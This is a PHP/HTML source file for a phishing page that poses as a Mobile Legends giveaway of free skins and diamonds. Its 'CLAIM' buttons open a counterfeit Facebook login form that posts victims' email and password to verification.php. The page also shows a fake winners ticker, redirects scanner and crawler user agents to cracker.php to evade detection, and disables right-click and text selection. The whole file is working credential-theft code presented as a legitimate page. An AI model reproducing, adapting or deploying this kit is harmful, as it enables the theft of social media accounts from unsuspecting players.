<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:title" content="Mobile Legends: Bang Bang"/>
<meta property="og:description" content="Get your favorite skins for free"/>
<meta property="og:image" content="https://i.ibb.co/C832Ykg/Capture.png"/>
<title>Mobile Legends</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous"/>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
<link rel="stylesheet" href="static/css/imryu.css">
<link rel="stylesheet" href="static/css/animate.css">
<link rel="stylesheet" href="static/css/facebook.css">
<link rel="stylesheet" href="static/css/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="shorcut icon" href="https://i.pinimg.com/originals/5f/3f/e8/5f3fe88ff2c07d4ebd0a85f64b272e05.jpg">
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-K23QTKJ');</script>
<!-- End Google Tag Manager -->
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<iframe scrolling='no' allow='autoplay' src='static/sound.mp3' width='0' height='0' frameborder='no'>
</iframe>
<div id="bg"></div>
<div class="ryucodex">
	<div class="navbar">
		<img class="logoLeft" src="https://pht.qoo-static.com/VObo_efVQ255Uny-K5k6EEMxQ9PQYk6PFNSReWDQxKf19HiXBH8BbluIzH1e43iQiw=w512">
		<div class="text-left text-white text-header">
			 MOBILE LEGENDS<br>
			<span>FREE SKIN & DIAMONDS</span>
		</div>
		<img class="logoRight" src="static/img/logo.png" alt="">
	</div>
	<div class="ryu-banner">
		<div id="carouselExampleSlidesOnly" class="carousel slide" data-ride="carousel">
			<div class="carousel-inner">
				<div class="carousel-item active">
					<video id="soundSystem" src="static/sound.mp3" autoplay muted class="img-ryu-banner1" style="display: none;"></video>
					<div style="position:relative;padding-bottom:56.25%;height:0;overflow:hidden;">
						<iframe style="width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden" frameborder="0" type="text/html" src=https://www.youtube.com/embed/TmoPedSbEVI?controls=0&loop=1&autoplay=1&fs=1&iv_load_policy=3&showinfo=0&rel=0&cc_load_policy=0&start=0&end=0&origin=https://youtubeembedcode.com width="100%" height="100%" allowfullscreen autoplay muted loop allow="autoplay" controls="0">
						</iframe>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="cat">
		<div class="boxCat isActive" style="width: 100%;">
			<img src="static/img/boxOff.png" alt="" style="width: 90%; height: 35px;">
			<div class="txtCat" style="font-size: 17px; margin: auto; margin-top: -29px; width: 90%; text-align: center; display: block;">
				<marquee style="margin: auto 20px;">
				<span>Congrats! MackuHaner opened Treasure Chest and got the permanent Epic skin Chang'e 'Lunar Magic'!</span>
				<span>Congrats! NADIAH opened Treasure Chest and got the permanent Epic skin Chang'e 'Lunar Magic'!</span>
				<span>Congrats! [408]Davislyh opened Treasure Chest and got the permanent Epic skin Hanabi "Rakshesha"!</span>
				<span>Congrats! hOrRiFiEd opened Treasure Chest and got the permanent Epic skin Chang'e 'Lunar Magic'!</span>
				<span>Congrats! Ree. opened Treasure Chest and got the permanent Epic skin Hanabi "Rakshesha"!</span>
				<span>Congrats! Celeste_05 opened Treasure Chest and got the permanent Epic skin Hanabi "Rakshesha"!</span>
				<span>Congrats! Nephilla opened Treasure Chest and got the permanent Epic skin Hanabi "Rakshesha"!</span>
				<span>Congrats! DoshKa YT opened Treasure Chest and got the permanent Epic skin Hanabi "Rakshesha"!</span>
				<span>Congrats! denguemasterz opened Treasure Chest and got the permanent Epic skin Hanabi "Rakshesha"!</span>
				<span>Congrats! KENZAN opened Treasure Chest and got the permanent Epic skin Hanabi "Rakshesha"!</span>
				</marquee>
			</div>
		</div>
	</div>
	<div class="cat">
		<div class="boxCat" id="showEpic">
			<img src="static/img/boxOn.png" alt="">
			<div class="txtCat">NEW SKIN</div>
		</div>
	</div>
	<div class="ryuContent">
		<div class="scroll">
			<div class="skins text-center pb-4" id="epic">
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/ZG3Nc8H/20220112-222452.gif" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src=" https://i.ibb.co/8bHMmtr/IMG-20220129-121231.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src=" https://i.ibb.co/mC5yrM6/20220112-225035.gif" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src=" https://i.ibb.co/ZzpXb28/20211213-230551.gif" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/rkZ1wvL/IMG-20220129-121206.jpg alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/7Cy7TST/IMG-20211017-121746.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/41WtRFh/IMG-20210912-055633.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/f9jvwZg/IMG-20210912-063450.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src=" https://i.ibb.co/0FCssLc/IMG-20211017-121853.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/f9jvwZg/IMG-20210912-063450.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/WBVsFHz/IMG-20210912-060032.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/s2LgRWc/IMG-20210912-055955.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/kof/6.png" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/kof/4.png" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/kof/5.png" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/ZcRxC9h/IMG-20210912-055733.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/WBVsFHz/IMG-20210912-060032.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/gg.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/zxRdcgn/IMG-20210912-055837.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/b5XgGZg/IMG-20210912-055904.jpg " alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/chou.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/ph7grWC/IMG-20210912-064101.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/d0jXRLh/IMG-20210912-064135.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/VDJmtxc/IMG-20210912-063335.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/ftc8J5T/IMG-20210912-063606.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/f9jvwZg/IMG-20210912-063450.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/NV45jgc/IMG-20210912-063733.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/nB118Qb/IMG-20210912-063801.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/s1p7YhN/IMG-20210912-063911.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/K6gX71h/Capture.png" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/12.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/13.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/gPJCv7Y/IMG-20210912-063533.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/2newc.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/2new.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/1new.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/16.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/sHsyVYh/IMG-20210912-055421.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/jLLBDqL/IMG-20210912-064404.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/11.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/3.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/7.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/2.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/6.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/4.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/8.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/9.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="static/img/skins/10.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
			</div>
			<div class="skins text-center pb-4" id="kof" style="display: none;">
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/Pcmw7rP/b1.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/G9gsVfz/b2.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/sqfMLmk/b3.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/DV8nKdc/b4.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/dm2jKFr/b5.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBox" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBox">
						<img src="https://i.ibb.co/vXyxPJt/b6.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
			</div>
			<div class="skins text-center pb-4" id="borders" style="display: none;">
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/borders/1.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/borders/2.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/borders/3.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/borders/4.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/borders/5.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/borders/6.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/borders/7.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/borders/8.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/borders/9.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/borders/10.jpeg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
			</div>
			<div class="skins text-center pb-4" id="dm" style="display: none;">
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/dm/5000.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/dm/2500.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/dm/1500.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/dm/1000.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
				<div class="boxSkins2">
					<img class="imgBoxDm" src="static/img/card.c777c1a0.png" alt="">
					<div class="contentBoxDm">
						<img src="static/img/dm/500.jpg" alt="">
						<button id="doLogin" class="btnSkins">CLAIM</button>
					</div>
				</div>
			</div>
		</div>
		<div class="ryubackdrop">
			<div class="ryuboxlogin animate__animated animate__fadeIn">
				<div class="row my-3 d-block mx-auto">
					<div class="closeBox">&times;</div>
					<div class="col-md-12 col-12 mb-4 text-white text-center ryutextbox">Login using your social media account</div>
					<div class="col-md-12 col-12">
						<button class="btn btn-primary text-left w-100" id="fbLogin" style="background-color: #2344ff !important; border: 1px solid #2344ff !important;"><i class="zmdi zmdi-facebook" style="font-size: 20px;"></i>
						<div class="txtLogin2" style="width: 90%;">Login with Facebook</div>
						</button>
					</div>
				</div>
			</div>
		</div>
<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a href="javascript:void(0);" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="static/img/facebook_text.png">
		</div>
		<div class="fb-alert" style="display: none;" id="fb_account_notfound">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></div>
		<div class="fb-alert" style="display: none;" id="fb_account_nopassword">Please enter your password. Did you forget your password?</div>
		<div class="fb-alert" style="display: none;" id="fb_account_wrongpassword">Incorrect password. Did you forget your password?</div>
		<div class="content-box-fb">
			<img src="https://i.pinimg.com/originals/5f/3f/e8/5f3fe88ff2c07d4ebd0a85f64b272e05.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to Mobile Legends
			</div>
			<form action="verification.php" method="post" onsubmit="return fb_validation()">
				<input type="text" class="loginEmail" name="email" id="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off">
				<input type="password" class="loginPassword" name="password" id="password" placeholder="Password" autocomplete="off" autocapitalize="off">
				<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
				<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>
		<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
		<script src="static/js/imryu.js"></script>
		<script src="static/js/fb_validation.js"></script>
		<script src="static/js/showHide.js"></script>
                <!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K23QTKJ"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
		</body>
		</html>
